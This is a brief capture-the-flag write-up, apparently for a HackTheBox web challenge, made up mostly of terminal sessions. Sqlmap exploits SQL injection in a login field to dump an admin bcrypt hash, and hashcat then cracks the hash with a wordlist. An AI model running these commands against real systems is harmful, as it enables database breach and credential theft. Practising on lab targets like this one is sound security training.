

![alt text](image.png)



![alt text](image-1.png)


```
┌──(kali㉿DESKTOP-KQAT41L)-[/mnt/c/Users/nonny/OneDrive/Desktop/hackthebox/Challenges/Web/KORP Terminal]
└─$ sqlmap -r request.txt -p username --ignore-code 401 --dbs

available databases [3]:
[*] information_schema
[*] korp_terminal
[*] test

┌──(kali㉿DESKTOP-KQAT41L)-[/mnt/c/Users/nonny/OneDrive/Desktop/hackthebox/Challenges/Web/KORP Terminal]
└─$ sqlmap -r request.txt -p username --ignore-code 401 -D korp_terminal --tables

Database: korp_terminal
[1 table]
+-------+
| users |
+-------+

┌──(kali㉿DESKTOP-KQAT41L)-[/mnt/c/Users/nonny/OneDrive/Desktop/hackthebox/Challenges/Web/KORP Terminal]
└─$ sqlmap -r request.txt -p username --ignore-code 401 -D korp_terminal -T users --columns

Database: korp_terminal
Table: users
[3 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| id       | int(11)      |
| password | varchar(255) |
| username | varchar(255) |
+----------+--------------+

┌──(kali㉿DESKTOP-KQAT41L)-[/mnt/c/Users/nonny/OneDrive/Desktop/hackthebox/Challenges/Web/KORP Terminal]
└─$ sqlmap -r request.txt -p username --ignore-code 401 -D korp_terminal -T users -C username,password --dump

Database: korp_terminal
Table: users
[1 entry]
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| admin    | $2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv. |
+----------+--------------------------------------------------------------+
```
https://www.vaadata.com/blog/sqlmap-the-tool-for-detecting-and-exploiting-sql-injections/

```
┌──(kali㉿DESKTOP-KQAT41L)-[/mnt/…/hackthebox/Challenges/Web/KORP Terminal]
└─$ hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
$2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.:password123

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8...63yiv.
Time.Started.....: Wed Aug  6 21:23:15 2025 (2 mins, 21 secs)
Time.Estimated...: Wed Aug  6 21:25:36 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       10 H/s (3.23ms) @ Accel:2 Loops:32 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1384/14344385 (0.01%)
Rejected.........: 0/1384 (0.00%)
Restore.Point....: 1380/14344385 (0.01%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4064-4096
Candidate.Engine.: Device Generator
Candidates.#1....: liberty -> password123

Started: Wed Aug  6 21:22:43 2025
Stopped: Wed Aug  6 21:25:37 2025
```
![alt text](image-2.png)



